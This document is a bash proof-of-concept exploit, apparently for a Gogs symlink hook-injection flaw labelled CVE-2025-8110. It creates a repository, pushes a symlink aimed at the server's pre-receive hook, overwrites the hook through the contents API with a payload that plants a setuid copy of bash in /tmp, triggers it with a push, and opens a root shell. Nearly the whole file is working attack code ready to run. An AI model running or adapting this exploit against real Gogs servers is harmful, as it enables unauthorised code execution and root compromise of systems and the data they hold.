#!/bin/bash
# CVE-2025-8110 - Gogs Symlink Hook Injection
# by MAVERICK-VF142
# github.com/maverick-vf142

echo "================================================"
echo "  CVE-2025-8110 - Gogs Symlink Hook Injection  "
echo "  by MAVERICK-VF142                            "
echo "  github.com/maverick-vf142                   "
echo "================================================"
echo ""

# Read inputs from /dev/tty to avoid pipe/terminal issues
exec < /dev/tty

printf "Gogs username: "; read -r USER
printf "Gogs email: "; read -r EMAIL
printf "Gogs password: "; read -rs PASS; echo ""
printf "Gogs API token: "; read -r TOKEN
echo ""

REPO="pwn_$(date +%s)"
WORKDIR="/tmp/$REPO"
ENCODED_PASS=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$PASS")

# 1. Create repo
echo "[*] Creating repo: $REPO"
curl -s -X POST \
  -H "Authorization: token $TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"name\":\"$REPO\",\"private\":false}" \
  http://localhost:3001/api/v1/user/repos > /dev/null
echo "[+] Repo created"
sleep 1

# 2. Clone
echo "[*] Cloning repo..."
git clone http://$USER:$ENCODED_PASS@localhost:3001/$USER/$REPO.git $WORKDIR
if [ ! -d "$WORKDIR" ]; then
  echo "[-] Clone failed, exiting"
  exit 1
fi
cd $WORKDIR
git config user.email "$EMAIL"
git config user.name "$USER"

# 3. Push symlink
echo "[*] Pushing symlink..."
ln -s /root/gogs-repositories/$USER/$REPO.git/hooks/pre-receive evil.link
git add .
git commit -m "link"
git push http://$USER:$ENCODED_PASS@localhost:3001/$USER/$REPO.git master
echo "[+] Symlink pushed"

# 4. Get SHA
echo "[*] Fetching symlink SHA..."
sleep 2
SHA=$(curl -s -H "Authorization: token $TOKEN" \
  http://localhost:3001/api/v1/repos/$USER/$REPO/contents/evil.link | \
  python3 -c "import sys,json; print(json.load(sys.stdin)['sha'])")
if [ -z "$SHA" ]; then
  echo "[-] Failed to get SHA, exiting"
  exit 1
fi
echo "[+] SHA: $SHA"

# 5. Inject payload
echo "[*] Injecting hook payload..."
PAYLOAD=$(printf '#!/bin/bash\ncp /bin/bash /tmp/rootbash\nchmod +s /tmp/rootbash\n' | base64 -w0)
curl -s -X PUT \
  -H "Authorization: token $TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"message\":\"pwn\",\"content\":\"$PAYLOAD\",\"sha\":\"$SHA\"}" \
  http://localhost:3001/api/v1/repos/$USER/$REPO/contents/evil.link > /dev/null
echo "[+] Payload injected"

# 6. Trigger
echo "[*] Triggering hook..."
echo "go" > t.txt
git add .
git commit -m "trigger"
git push http://$USER:$ENCODED_PASS@localhost:3001/$USER/$REPO.git master
echo "[+] Hook triggered"

# 7. Root
sleep 1
echo ""
if [ -f /tmp/rootbash ]; then
  echo "[+] $(ls -la /tmp/rootbash)"
  echo ""
  echo "[+] ROOTED!"
  echo ""
  /tmp/rootbash -p
else
  echo "[-] rootbash not found, something went wrong"
fi
